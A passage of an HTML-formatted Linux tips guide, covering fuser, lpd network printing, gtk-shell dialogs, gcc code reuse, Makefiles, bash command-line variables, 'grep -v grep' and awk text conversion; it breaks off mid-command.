0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Another interesting command is the fuser program. This program can tell you which user and process owns a</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >port. For example, the following command will tell you who owns port 6000:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >fuser -v -n tcp 6000</SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.15</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 15: Network printers</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >By tradition in Unix most services come with networking capabilities. This includes the printing server. You</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >don't need to get third party software to make a printing server.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The lpd daemon allows you to print to your local printer, but also allows others to print on it, if you allow</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >them.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >By default the printing software will read on port 515 on the UDP protocol. It will allow hosts listed in the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >/etc/hosts.lpd to print using your printer.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >For a full overview of the printing service, you should check the printing howto on the Web.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >&nbsp;</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >&nbsp;</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >&nbsp;</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >&nbsp;</FONT></SPAN></P>  <H1 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="3" >3.</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="3" >Development</FONT></SPAN></SPAN></A></H1>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This last chapter covers development. A standard Linux system comes with many compilers and interpreters</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >for a lot of languages. We cover most of them, and will see tips and tricks on how to use them for small</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >scripts or powerful applications.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >3.1</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 1: Graphical messages to the world</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Often we write shell scripts and at one point we would like to display messages or otherwise interact with the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >user using a graphical way, without rewriting all our script in C.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >A small program called gtk-shell was created for that purpose. It is a GTK-based program meant to be used in</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >shell scripts, that can interact with the user, and even return values to the script. Let's see a very simple</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >example:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >xv -quit -root `gtk-shell -t "Which file do you want me to use?" -fs`</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This will display a graphical browsing box with the specified title, where the user can select a file, and the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >file path will be returned to xv which will display it as background.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Gtk-shell can be used in many ways including displaying a message, asking for input, and more. Here is an</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >output of "gtk-shell --help":</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >gtk-shell (C) 1999 Patrick Lambert under GPL</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >This program will use the GTK library (www.gtk.org) to ask for user input,</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >and can be used in scripts or called from other programs.</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >Command line options:</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >--help, -h This help text</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >--version, -v Show gtk-shell's version</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >--output &lt;file&gt;, -o Set the output file, default is stdout</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >--title &lt;title&gt;, -t Set the window title</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >--label &lt;label&gt;, -l Show a label to the user</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >--file-selection, -fs Display a file selection box</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >--size &lt;x&gt; &lt;y&gt;, -s Set the size of the window</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >--position &lt;x&gt; &lt;y&gt;, -p Set the position of the window on the screen</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >--query, -q Display a query box</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >--query-value, -qv Set a value in the query box</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >--append-eol, -eol Appends an EOL char at output time</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >--exit-code &lt;str&gt;, -ec String to display if user press Cancel</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >--view-file &lt;file&gt;, -vf View a file in a text box</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >--edit-file &lt;file&gt;, -ef Edit a file in a text box</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >--button &lt;str&gt;, -b Add a button to quit</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >--choice &lt;c1&gt; &lt;c2&gt;.., -c Display a choice box with the specified choices</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >Example: gtk-shell -l "Pick a choice" -c 1 2 3 4 -b Ok -eol</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >Example: xv -quit -root `gtk-shell -t "Which image?" -fs`</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >Gtk-shell is available at </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  ><A rel="nofollow" href="http://devplanet.fastethernet.net/files.html"  >http://devplanet.fastethernet.net/files.html</A></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >.</SPAN></FONT></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >3.2</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 2: Code reuse</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Why write code that we already wrote for previous programs? Well here is a small tip that might save you</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >some time: Make a generic file with reusable functions.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Many languages make this easy to do. Object oriented languages like Java or C++ for example allow you to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >make a class with utility functions, and then import them in your main program. This way you can use the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >generic class in all your programs. Even in C you can do this by including the generic C file when compiling</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >with a command like:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >gcc -o myprogram myprogram.c generic.c</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Your generic utility functions would be in generic.c and gcc would simply add the file to myprogram.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >3.3</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 3: Makefile don't equal C</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Makefiles are used in most Unix C or even C++ programs. But nowhere does it say that they can't be used for</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >other languages. Make is a program installed with most Linux distributions, and on most Unix systems too.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Makefiles make your program portable, and easy to compile. These files can be used in C, C++, Java, and</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >any program that requires compilation.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Make has so many useful applications. Feel free to explore them for your programs.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >3.4</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 4: Parsing the command line in BASH</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Bash is a shell, but it's also a scripting language. You can make bash scripts, and you can pass parameters to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >it. You can access the parameters with $1, $2, ... But what if you need the whole command line?</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Bash uses special variables for all kind of purposes. One of them is $* which contains the whole command</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >line. You can use it rather than the $1, $2 if all you need is a string of text, passed on the command line.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >3.5</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 5: Don't grep grep</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >A useful tool in scripting is the "grep" function. This program will find a string in a file. It is often used also</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >to find if a process is running:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >ps ax | grep sendmail</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >That command will find if sendmail is running. The problem is that you might end up with an other entry for</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >this command. Because you grep for "sendmail", you may well end up with this command showing because</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >the "sendmail" string is in the command line. To avoid that, you can use the -v flag to grep:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >ps ax | grep sendmail | grep -v grep</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >That command will find all the lines in the current process list that have the "sendmail" string in it, and will</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >remove the lines containing the string "grep".</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >3.6</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 6: Move a text into upper case letters</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When you want to do text manipulation, you can use Sed and Awk. These 2 tools which come on most Linux</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >distributions, will allow you to modify text files in many ways.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >To move a text file into upper case letters, you can use Awk in the following way:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >awk '{ print 